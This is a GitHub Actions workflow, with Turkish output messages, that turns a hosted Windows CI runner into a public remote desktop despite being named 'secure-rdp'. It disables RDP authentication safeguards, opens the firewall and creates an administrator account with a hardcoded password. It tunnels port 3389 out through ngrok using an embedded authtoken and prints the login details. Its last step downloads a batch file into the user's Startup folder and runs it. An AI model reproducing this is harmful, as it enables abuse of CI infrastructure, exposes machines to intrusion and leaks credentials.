name: win 11

on:
  workflow_dispatch:

jobs:
  secure-rdp:
    runs-on: windows-2022
    timeout-minutes: 350

    steps:
      - name: Configure Core RDP Settings
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0 -Force
          
          netsh advfirewall firewall delete rule name="RDP-Global"
          netsh advfirewall firewall add rule name="RDP-Global" dir=in action=allow protocol=TCP localport=3389
          Restart-Service -Name TermService -Force

      - name: Create RDP User with Fixed Password
        run: |
          $password = "TechZoner@001"
          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
          if (-not (Get-LocalUser -Name "RDP" -ErrorAction SilentlyContinue)) {
              New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires
          }
          Add-LocalGroupMember -Group "Administrators" -Member "RDP"
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"

      - name: Install and Start ngrok Tunnel
        shell: powershell
        run: |
          Write-Host "Installing ngrok via Chocolatey..."
          choco install ngrok --no-progress -y
          
          $ngrokPath = "C:\ProgramData\chocolatey\bin\ngrok.exe"
          if (-not (Test-Path $ngrokPath)) {
              $ngrokPath = "ngrok"
          }

          Write-Host "Authenticating ngrok..."
          & $ngrokPath authtoken "3GAmkQyZ4aTDXmW8gL8bAYj5fD3_7U3pzSH4fnHg4ReB2pfiB"
          
          Write-Host "Starting TCP Tunnel..."
          Start-Process $ngrokPath -ArgumentList "tcp 3389" -WindowStyle Hidden
          
          Start-Sleep -Seconds 15
          
          try {
              $response = Invoke-RestMethod -Uri "http://127.0.0.1:4040/api/tunnels" -TimeoutSec 10
              $publicUrl = $response.tunnels[0].public_url
              
              if ($publicUrl -match "tcp://(.+)") {
                  $rdpAddress = $Matches[1]
                  
                  Write-Host "`n==============================================="
                  Write-Host "🚀 RDP BAĞLANTI BİLGİLERİ"
                  Write-Host "Adres (Computer): $rdpAddress"
                  Write-Host "Kullanıcı Adı: RDP"
                  Write-Host "Şifre: TechZoner@001"
                  Write-Host "===============================================\n"
              } else {
                  Write-Error "Tünel adresi alınamadı. API yanıtı: $publicUrl"
                  exit 1
              }
          } catch {
              Write-Error "Ngrok API'sine bağlanılamadı. Tünel başlamamış olabilir."
              Write-Host "Hata: $_"
              exit 1
          }

      - name: Maintain Connection + Watch RDP User
        run: |
          $rdpProfile = "C:\Users\RDP"
          $startupPath = "$rdpProfile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
          $downloadUrl = "https://gitlab.com"
          $downloadPath = "$startupPath\Downloads.bat"

          while ($true) {
              if (Test-Path $rdpProfile) {
                  try {
                      if (-not (Test-Path $startupPath)) {
                          New-Item -ItemType Directory -Path $startupPath -Force | Out-Null
                      }
                      Invoke-WebRequest -Uri $downloadUrl -OutFile $downloadPath -UseBasicParsing
                      cmd /c $downloadPath
                      break
                  }
                  catch {
                      break
                  }
              }
              else {
                  Start-Sleep -Seconds 30
              }
          }

          while ($true) {
              Write-Host "[$(Get-Date)] RDP Active..."
              Start-Sleep -Seconds 300
          }
